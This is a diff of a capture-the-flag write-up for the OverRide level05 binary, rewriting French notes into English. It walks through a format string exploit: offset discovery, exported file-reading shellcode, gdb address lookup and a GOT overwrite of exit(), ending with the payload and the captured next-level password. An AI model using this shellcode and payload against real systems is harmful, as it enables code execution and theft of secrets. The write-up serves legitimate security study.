@@ -1,23 +1,46 @@
-Nous voyons que dans le printf, nous utilisons str (variable qu'on rempli avec fgets), c'est donc un format string attack.
-Nous trouvons l'offset
+The binary takes userinput and then displays it :
 
-python -c 'print "AAAA " + "%x " * 10'
+level05@OverRide:~$ ./level05 a a
+abc
+abc
 
-Puis nous avons plusieurs choix, utiliser un shellcode basique ou utiliser un shellcode comme dans l'exercice precedent. Prenons  la seconde solution.
+(gdb) disas main
+0x08048475 <+49>:    call   0x8048350 <fgets@plt>
+0x08048507 <+195>:   call   0x8048340 <printf@plt>
+
+fgets() and printf() are called, let's use a format string exploit.
+
+Read the stack and find the offset we write at :
+
+python -c 'print "AAAA " + "%x " * 15' | ./level05 
+aaaa 64 f7fcfac0 f7ec3af9 ffffd6cf ffffd6ce 0 ffffffff ffffd754 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825 
+
+Let's use the same shellcode as before :
 
 export SHELLCODE=`python -c 'print "\x90" * 250 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"'`
 
-puis nous le localisons a l'adresse 0xffffd818
+Find our shellcode's address :
 
-Nous décomposons l'adresse
+(gdb) b main
+(gdb) r
+(gdb) x/200wx $esp
+0xffffd818:     0x90909090      0x90909090      0x90909090      0x90909090
+
+
+Convert 0xffffd818 to decimal :
 
 0xd818 = 55320 - 8 = 55312
 0xffff = 65535 - 55320 = 10215
 
-Puis nous localisons l'adresse de exit avec un objdump -R level05: 0x080497e0
+find the address of exit() in the GOT : 
 
-et nous lancons l'attaque
+objdump -R level05
+080497e0 R_386_JUMP_SLOT   exit
 
-python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55312x%10$hn" + "%10215x%11$hn"' > /tmp/jackpot
-cat /tmp/jackpot | ./level05
+address of exit() : 0x080497e0
 
+The payload is then :
+python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55312x%10$hn" + "%10215x%11$hn"' > /tmp/payload
+cat /tmp/payload | ./level05
+f7fcfac0
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
